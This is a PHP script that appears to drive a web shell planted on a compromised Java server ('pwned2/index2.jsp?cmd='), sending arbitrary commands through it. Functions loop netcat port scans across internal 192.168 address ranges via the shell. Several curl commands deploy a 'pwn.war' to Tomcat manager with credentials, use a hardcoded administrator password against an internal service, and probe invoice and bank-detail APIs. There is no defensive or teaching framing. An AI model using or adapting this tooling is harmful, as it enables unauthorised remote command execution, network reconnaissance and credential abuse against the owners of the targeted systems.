<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';

function universal_dab($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/pwned2/index2.jsp?cmd=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}
function port_scanner($port, $ip,  $obj, $max = 2000)
{
    if ($port < $max) {
        $a = $port;
        $b = 0;
        $c = 500;
        $ab = $a + $b;
        $ac = $a + $c;
        $rng = $ab . '-' . $ac;
        $cmd = "nc -zv " . $ip . " " . $rng;
        $dt = universal_dab($cmd, 'head');
        $port = $port + 500;
        $obj .= $dt;
        echo $dt;
        port_scanner($port, $ip,  $obj, $max);
    } else {
        return $obj;
    }
}

function port_finder($ip, $ab, $ac)
{
    $rng = $ab . '-' . $ac;
    $cmd = "nc -zv " . $ip . " " . $rng;
    $dt = universal_dab($cmd, 'head');
    return $dt;
}
function port_func()
{
    for ($a = 0; $a <= 1; $a++) {
        for ($b = 0; $b <= 5; $b++) {
            $ip = "192.168." . $a . "." . $b;
            $ddd = port_finder($ip, 3300, 3310);
            echo $ddd;
            // file_put_contents('store_5/port.html', $ddd, FILE_APPEND);
        }
    }
    return 'done';
}

$a = 19500;

$b = 0;
$c = 500;
$ab = $a + $b;
$ac = $a + $c;

$rng = $ab . '-' . $ac;
$cmd = "curl 192.168.102.22:8080/";
//$data = '{"invoice_no":"BL-UBP-164232","bankdetails":null}';
//$data = '"invoice_no=BL-UBP-164232&bankdetails="';
//$cmd = "curl -X POST 192.168.102.20:8003/taifa/nrs/consolidate  -H 'Content-Type: application/json' -d '".$data."'";
//$cmd = "curl  -X POST 192.168.102.20:8003/taifa/nrs/confirm";
//$cmd = "curl -X POST 192.168.102.20:8003/taifa/nrs/validate -d 'referense=BL-UBP-164232'";
//$cmd = "nc -zv 192.168.100.151 ".$rng;
//$line = 'for ip in $(seq 1 254); do if ping -c 1 -W 1 192.168.1.$ip > /dev/null 2>&1; then echo 200; fi; done';
//$cmd = "bash -c 'ping -c 1 -W 1 192.168.1.1 > /dev/null 2>&1 && echo 200 || echo 404'";
//$cmd = 'ping -c 1 -W 1 192.168.1.1 > /dev/null 2>&1 && echo 200 || echo 404';
$cmd = 'ping -c 1 -W 1 192.168.1.1';
$cmd = 'curl -v -u tomcat:$pass — upload-file pwn.war "http://x.x.x.x:8080/manager/text/deploy?path=/foo&update=true"';
$cmd = 'curl -u Administrator:$tn3my@p$ http://192.168.0.64:6063/upgw/WS/UPGW/Codeunit/UPGW';

//echo $cmd;

echo universal_dab($cmd, 'head');
//echo port_scanner(1, "192.168.102.22", "", 10000);
//echo port_scanner(1, "192.168.0.1", "", 66000);
//echo port_func();
function finder_loop($a, $b)
{
    //$a = 1;
    $p1 = (string)$b;
    $p2 = (string)$a;
    $port = '192.168.0.1';
    //$port = "192.168." . $p1 . "." . $p2;
    echo port_finder($port, '3306', '3307');
}

/*
$pprs = [1, 2, 3, 4, 5];
foreach ($pprs as $port) {
    $b = 1;
    $p1 = (string)$b;
    $p2 = (string)$port;
    //$port = '192.168.0.1';
    $port = "192.168." . $p1 . "." . $p2;

    //echo port_finder($port, '3306', '3307');
}
$port = '192.168.0.1';
//$port = "192.168." . $p1 . "." . $p2;

echo port_finder($port, '3306', '3307');
//*/

